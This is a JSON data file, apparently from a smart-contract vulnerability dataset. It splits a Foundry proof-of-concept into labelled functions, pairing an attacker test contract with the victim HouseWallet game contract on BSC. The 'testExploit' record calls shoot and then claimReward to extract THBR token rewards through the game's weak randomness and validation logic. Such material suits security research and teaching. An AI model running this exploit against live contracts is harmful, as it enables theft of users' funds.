[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ninterface HouseWallet {\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21_785_004);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_uint(\"Attacker THBR balance before exploit\", THBR.balanceOf(address(this)));\n\n        houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);\n        uint256 _amount = houseWallet.winners(gameId, add);\n        houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);\n\n        emit log_named_uint(\"Attacker THBR balance after exploit\", THBR.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HouseWallet",
    "source_type": "victim_contract",
    "function_name": "claimReward",
    "original_code": "    function claimReward(\n        uint256 _ID,\n        address payable _player,\n        uint256 _amount,\n        bool _rewardStatus,\n        uint256 _x,\n        string memory name,\n        address _add\n    ) external {\n        require(gameMode);\n        bool checkValidity = guess(_x, name, _add);\n\n        if (checkValidity == true) {\n            if (winners[_ID][_player] == _amount) {\n                _player.transfer(_amount * 2);\n                if (_rewardStatus == true) {\n                    sendReward();\n                }\n                delete winners[_ID][_player];\n            } else {\n                if (_rewardStatus == true) {\n                    sendRewardDys();\n                }\n            }\n            rewardStatus = false;\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HouseWallet",
    "source_type": "victim_contract",
    "function_name": "shoot",
    "original_code": "    function shoot(\n        uint256 random,\n        uint256 gameId,\n        bool feestate,\n        uint256 _x,\n        string memory name,\n        address _add,\n        bool nftcheck,\n        bool dystopianCheck\n    ) external payable {\n        require(gameMode);\n\n        if (0.32 * 10**18 >= msg.value && 0.006 * 10**18 <= msg.value) {\n            playerFee = ((msg.value * 38) / 1038);\n            holderFee = ((playerFee * 25) / 1000);\n            liquidityFee = ((playerFee * 1) / 1000);\n            ownerFee = ((playerFee * 125) / 100000);\n\n            bool checkWinstatus = guessWin(_x, name, _add);\n\n            if (checkWinstatus == true) {\n                winners[gameId][msg.sender] = (msg.value - playerFee);\n                winStatus = true;\n            }\n\n            if (feestate == true) {\n                payable(Fee_Wallet).transfer(holderFee);\n                payable(Liqudity_Address).transfer(liquidityFee);\n                payable(owner()).transfer(ownerFee);\n            }\n\n            randomNumber =\n                uint256(\n                    keccak256(\n                        abi.encodePacked(\n                            msg.sender,\n                            block.timestamp,\n                            randomNumber\n                        )\n                    )\n                ) %\n                10;\n            if (winStatus == true) {\n                if (nftcheck == true && randomNumber == random) {\n                    rewardStatus = true;\n                }\n                winStatus = false;\n            } else {\n                if (dystopianCheck == true && randomNumber == random) {\n                    rewardStatus = true;\n                }\n            }\n        } else {\n            fakeUsers.push(msg.sender);\n            gameMode = false;\n            dangerMode = true;\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HouseWallet",
    "source_type": "victim_contract",
    "function_name": "winners",
    "original_code": "",
    "description": ""
  }
]